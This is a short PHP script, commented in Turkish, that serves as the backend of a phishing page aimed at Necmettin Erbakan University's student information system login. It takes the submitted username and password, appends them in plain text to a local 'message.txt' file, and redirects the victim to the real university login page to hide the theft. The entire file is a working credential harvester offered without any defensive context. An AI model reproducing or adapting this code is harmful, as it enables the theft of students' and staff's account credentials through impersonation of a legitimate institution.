<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Form verilerini al
    $username = $_POST['txtParamT01'];
    $password = $_POST['txtParamT02'];
    

    // Veriyi "message.txt" dosyasına kaydet
    $file = 'message.txt';

    // Kullanıcı adı, şifre ve güvenlik kodunu dosyaya yaz
    file_put_contents($file, "Kullanıcı Adı: " . $username . "\nŞifre: " . $password . "\n\n", FILE_APPEND | LOCK_EX);

    // İşlem başarılıysa kullanıcıyı yönlendir
    header('Location: https://obs.erbakan.edu.tr/oibs/acd/login.aspx');
    exit;
}
?>
